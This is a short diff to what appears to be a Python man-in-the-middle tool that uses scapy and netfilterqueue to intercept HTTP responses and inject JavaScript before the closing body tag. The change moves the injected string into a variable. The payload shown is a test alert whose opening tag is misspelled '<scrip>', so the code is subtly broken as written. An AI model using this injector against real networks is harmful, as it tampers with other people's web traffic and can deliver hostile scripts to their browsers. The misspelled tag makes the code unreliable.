@@ -24,7 +24,8 @@ def process_packet(packet):
 
         elif http_packet[scapy.TCP].sport == 80:
             print("[+] Response...")
-            load = load.replace("</body>", "<scrip>alert('test');</script></body>")
+            injection_code = "<scrip>alert('test');</script>"
+            load = load.replace("</body>", injection_code + "</body>")
             content_length_search = re.search("(?:Content-Length:\\s)(\\d*)", load)
             if content_length_search:
                 content_length = content_length_search.group(1)
@@ -36,7 +37,6 @@ def process_packet(packet):
 
     packet.accept()
     send(http_packet)
-
 
 # queue = netfilterqueue.NetfilterQueue()
 # queue.bind(0, process_packet)
